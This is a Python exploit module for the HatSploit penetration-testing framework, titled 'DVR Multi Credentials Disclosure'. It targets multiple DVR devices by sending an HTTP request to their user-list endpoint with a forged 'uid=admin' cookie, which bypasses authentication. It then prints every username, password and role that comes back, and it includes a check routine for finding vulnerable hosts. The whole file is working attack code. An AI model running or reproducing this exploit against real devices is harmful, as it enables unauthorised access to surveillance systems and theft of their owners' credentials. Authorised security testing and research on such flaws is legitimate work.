"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import json

from hatsploit.lib.module import Module
from pex.proto.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "exploit",
            'Name': "DVR Multi Credentials Disclosure",
            'Module': "exploit/linux/generic/dvr_credentials_disclosure",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
                'ezelf - vulnerability researcher',
            ],
            'Description': "Multiple DVR devices credentials disclosure.",
            'Platform': "linux",
            'Rank': "high",
        }

        self.options = {
            'HOST': {
                'Description': "Remote host.",
                'Value': None,
                'Type': "ip",
                'Required': True,
            },
            'PORT': {
                'Description': "Remote port.",
                'Value': 80,
                'Type': "port",
                'Required': True,
            },
        }

    def exploit(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/device.rsp?opt=user&cmd=list',
            cookies={"uid": "admin"},
        )

        try:
            json_data = json.loads(response.text)
            credentials = [
                (data["uid"], data["pwd"], data["role"])
                for data in json_data["list"]
            ]
            self.print_table(
                "Credentials", ('Username', 'Password', 'Role'), *credentials
            )
        except Exception:
            self.print_warning("Target vulnerable, but no credentials found.")

    def check(self):
        remote_host, remote_port = self.parse_options(self.options)

        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/device.rsp?opt=user&cmd=list',
        )

        return bool(response and response.status_code == 200)

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.exploit(remote_host, remote_port)
